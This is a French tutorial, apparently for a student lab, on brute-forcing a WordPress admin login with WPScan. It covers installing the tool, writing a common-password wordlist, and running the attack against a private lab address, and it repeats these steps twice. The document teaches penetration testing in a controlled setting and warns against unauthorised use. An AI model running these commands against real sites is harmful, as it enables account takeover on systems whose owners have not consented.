### Tutoriel Complet pour une Attaque par Force Brute sur WordPress avec WPScan

#### Prérequis
1. **Kali Linux** ou toute autre distribution Linux.
2. **Ruby** et **RubyGems** installés sur votre système.

### Étape 1: Installation de Ruby et RubyGems

1. **Mettre à jour votre système** :
    ```bash
    sudo apt update
    ```

2. **Installer Ruby et RubyGems** :
    ```bash
    sudo apt install ruby ruby-dev
    ```

### Étape 2: Installation de WPScan

1. **Installer WPScan via RubyGems** :
    ```bash
    sudo gem install wpscan
    ```

### Étape 3: Préparation du fichier de mots de passe

1. **Créer un fichier de mots de passe courant** :
    ```plaintext
    admin
    root
    leo
    123456
    password
    qwerty
    letmein
    football
    monkey
    admin123
    welcome
    ninja
    abc123
    admin@123
    1234
    password1
    passw0rd
    12345
    default
    superuser
    adminadmin
    administrator
    manager
    guest
    test
    ```

2. **Sauvegardez ce fichier dans le répertoire `/home/eleve/` sous le nom `passwords.txt`** :
    ```bash
    echo -e "admin\nroot\nleo\n123456\npassword\nqwerty\nletmein\nfootball\nmonkey\nadmin123\nwelcome\nninja\nabc123\nadmin@123\n1234\npassword1\npassw0rd\n12345\ndefault\nsuperuser\nadminadmin\nadministrator\nmanager\nguest\ntest" > /home/eleve/passwords.txt
    ```

### Étape 4: Utilisation de WPScan pour une Attaque par Force Brute

1. **Exécuter WPScan pour effectuer une attaque par force brute** :
    ```bash
    wpscan --url http://10.0.2.5/monwordpress1 --usernames admin --passwords /home/eleve/passwords.txt
    ```

### Étape par Étape

1. **Mettez à jour votre système et installez Ruby** :
    ```bash
    sudo apt update
    sudo apt install ruby ruby-dev
    ```

2. **Installez WPScan via RubyGems** :
    ```bash
    sudo gem install wpscan
    ```

3. **Créez le fichier de mots de passe courant** :
    ```bash
    echo -e "admin\nroot\nleo\n123456\npassword\nqwerty\nletmein\nfootball\nmonkey\nadmin123\nwelcome\nninja\nabc123\nadmin@123\n1234\npassword1\npassw0rd\n12345\ndefault\nsuperuser\nadminadmin\nadministrator\nmanager\nguest\ntest" > /home/eleve/passwords.txt
    ```

4. **Exécutez WPScan pour l'attaque par force brute** :
    ```bash
    wpscan --url http://10.0.2.5/monwordpress1 --usernames admin --passwords /home/eleve/passwords.txt
    ```

### Conclusion

En suivant ces étapes, vous pourrez effectuer une attaque par force brute sur un site WordPress en utilisant WPScan. Assurez-vous d'utiliser ces techniques de manière éthique et légale dans un environnement contrôlé. Attaquer des systèmes sans autorisation est illégal et contraire à l'éthique.
